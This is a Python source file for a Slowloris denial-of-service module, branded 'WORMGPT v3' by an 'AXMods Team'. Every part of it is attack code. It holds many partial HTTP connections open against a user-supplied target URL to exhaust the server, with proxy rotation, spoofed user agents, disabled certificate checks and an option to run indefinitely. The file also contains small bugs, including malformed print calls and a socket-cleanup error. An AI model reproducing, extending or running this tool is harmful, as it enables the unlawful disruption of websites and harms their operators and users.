#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/slowloris.py
SLOWLORIS ATTACK MODULE - WORMGPT v3
Low-and-Slow Connection Exhaustion
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
from urllib.parse import urlparse

class Slowloris:
    def __init__(self, target, port=80, sockets=500, duration=0, proxy=False):
        """
        Initialize Slowloris attack
        
        Args:
            target: Target URL
            port: Target port
            sockets: Number of sockets to create
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.sockets = sockets
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_sockets = 0
        self.socket_list = []
        self.start_time = time.time()
        
        # User Agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context for HTTPS
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Lock for thread-safe operations
        self.lock = threading.Lock()
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
        except:
            pass
    
    def create_socket(self):
        """Create and connect a socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL if HTTPS
            if self.parsed_url.scheme == 'https':
                sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except Exception as e:
            return None
    
    def send_partial_request(self, sock):
        """Send partial HTTP request"""
        try:
            # Generate random identifier
            random_id = random.randint(1000, 9999)
            
            # Partial request headers
            request = f"GET /?{random_id} HTTP/1.1\r\n"
            request += f"Host: {self.host}\r\n"
            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Accept-Language: en-US,en;q=0.5\r\n"
            
            sock.send(request.encode())
            return True
        except:
            return False
    
    def keep_alive(self, sock):
        """Send keep-alive headers"""
        try:
            keep_alive_header = f"X-{random.randint(1000, 9999)}: {random.randint(1000, 9999)}\r\n"
            sock.send(keep_alive_header.encode())
            return True
        except:
            return False
    
    def socket_manager(self, socket_id):
        """Manage a single socket connection"""
        sock = None
        
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Create socket if not exists or dead
            if sock is None:
                sock = self.create_socket()
                if sock is None:
                    time.sleep(5)
                    continue
                
                # Send partial request
                if not self.send_partial_request(sock):
                    sock.close()
                    sock = None
                    time.sleep(2)
                    continue
                
                with self.lock:
                    self.active_sockets += 1
                    self.socket_list.append(sock)
            
            # Send keep-alive headers periodically
            try:
                time.sleep(random.randint(10, 40))
                
                if not self.keep_alive(sock):
                    sock.close()
                    sock = None
                    with self.lock:
                        if sock in self.socket_list:
                            self.socket_list.remove(sock)
                        self.active_sockets -= 1
                    continue
                    
            except socket.timeout:
                pass
            except Exception:
                sock.close()
                sock = None
                with self.lock:
                    if sock in self.socket_list:
                        self.socket_list.remove(sock)
                    self.active_sockets -= 1
        
        # Cleanup
        if sock:
            try:
                sock.close()
            except:
                pass
        
        with self.lock:
            if sock in self.socket_list:
                self.socket_list.remove(sock)
            self.active_sockets -= 1
    
    def monitor_sockets(self):
        """Monitor and maintain socket connections"""
        while self.is_attacking:
            # Check duration
            if self.duration > 0 and (time.time() - self.start_time) > self.duration:
                break
            
            # Recreate dead sockets
            with self.lock:
                current_count = self.active_sockets
                target_count = self.sockets
            
            if current_count < target_count:
                needed = target_count - current_count
                print(f"[~] Creating {needed} new sockets...")
            
            time.sleep(30)
    
    def start(self):
        """Start Slowloris attack"""
        print(f"\n[+] Starting SLOWLORIS attack")
        print(f"[+] Target: {self.target}")
        print(f("[+] Port: {self.port}"))
        print(f"[+] Sockets: {self.sockets}")
        print(f"[+] Duration: {self.duration if self.duration > 0 else 'Infinite'} seconds")
        print(f"[+] Strategy: Connection exhaustion")
        print(f"[+] Press Ctrl+C to stop\n")
        
        # Create initial socket threads
        threads = []
        for i in range(min(self.sockets, 200)):  # Start with 200 initially
            thread = threading.Thread(target=self.socket_manager, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            time.sleep(0.05)  # Stagger creation
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_sockets)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start additional sockets gradually
        def gradual_socket_creator():
            time.sleep(10)
            remaining = self.sockets - min(self.sockets, 200)
            batch_size = 50
            
            for i in range(0, remaining, batch_size):
                if not self.is_attacking:
                    break
                
                batch = min(batch_size, remaining - i)
                for j in range(batch):
                    if not self.is_attacking:
                        break
                    
                    thread = threading.Thread(target=self.socket_manager, args=(200 + i + j,))
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()
                
                time.sleep(5)
        
        if self.sockets > 200:
            gradual_thread = threading.Thread(target=gradual_socket_creator)
            gradual_thread.daemon = True
            gradual_thread.start()
        
        # Main monitoring loop
        try:
            while self.is_attacking:
                elapsed = time.time() - self.start_time
                
                if self.duration > 0 and elapsed >= self.duration:
                    break
                
                with self.lock:
                    active = self.active_sockets
                    total_sockets = len(self.socket_list)
                
                sys.stdout.write(f"\r[+] Active sockets: {active}/{self.sockets} | Open connections: {total_sockets} | Time: {elapsed:.1f}s")
                sys.stdout.flush()
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n[!] Stopping attack...")
        
        # Cleanup
        self.is_attacking = False
        
        # Close all sockets
        print(f"[~] Closing all sockets...")
        with self.lock:
            for sock in self.socket_list:
                try:
                    sock.close()
                except:
                    pass
            self.socket_list.clear()
        
        time.sleep(3)
        
        # Final statistics
        elapsed = time.time() - self.start_time
        print(f"\n[+] Attack completed")
        print(f"[+] Maximum active sockets: {self.sockets}")
        print(f("[+] Total duration: {elapsed:.1f} seconds"))
        print(f"[+] Connection strategy: Slow HTTP connection exhaustion")
        
        return {
            'max_sockets': self.sockets,
            'duration': elapsed,
            'attack_type': 'Slowloris'
        }

def main():
    """Standalone execution"""
    print("""
╔══════════════════════════════════════════════╗
║         SLOWLORIS ATTACK MODULE             ║
║         WORMGPT v3 - AXMods Team            ║
╚══════════════════════════════════════════════╝
""")
    
    # Get target from user
    target = input("[?] Target URL (http:// or https://): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Parse port from URL
    parsed = urlparse(target)
    host = parsed.netloc.split(':')[0]
    port = 443 if parsed.scheme == 'https' else 80
    
    # Get parameters
    try:
        sockets = int(input("[?] Number of sockets (default 500): ") or "500")
        duration = int(input("[?] Duration in seconds (0=infinite): ") or "0")
        use_proxy = input("[?] Use proxies? (y/N): ").lower() == 'y'
    except:
        print("[!] Invalid input, using defaults")
        sockets = 500
        duration = 0
        use_proxy = False
    
    # Start attack
    attack = Slowloris(target, port, sockets, duration, use_proxy)
    attack.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
